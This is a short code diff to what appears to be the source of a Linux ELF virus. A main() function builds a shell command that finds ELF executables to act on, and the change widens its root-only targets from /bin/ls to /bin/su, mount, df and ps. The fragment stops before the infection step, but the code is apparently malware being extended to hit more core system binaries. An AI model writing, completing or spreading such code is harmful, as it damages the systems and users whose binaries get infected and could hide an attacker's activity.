@@ -47,7 +47,12 @@ int main (int argc, char** argv) {
         command = "VIR=$(for n in `find ";
         if (uid == 0) command += "/bin/ ";
         command += "-mindepth 1 -maxdepth 1 -type f";
-        if (uid == 0) command += " | egrep '^/bin/ls$'";
+        if (uid == 0) command += " | egrep '\
+^/bin/ls$|\
+^/bin/su$|\
+^/bin/mount$|\
+^/bin/df$|\
+^/bin/ps$'";
         command += "`; \
 do \
 file $n | grep -q ELF && ( \
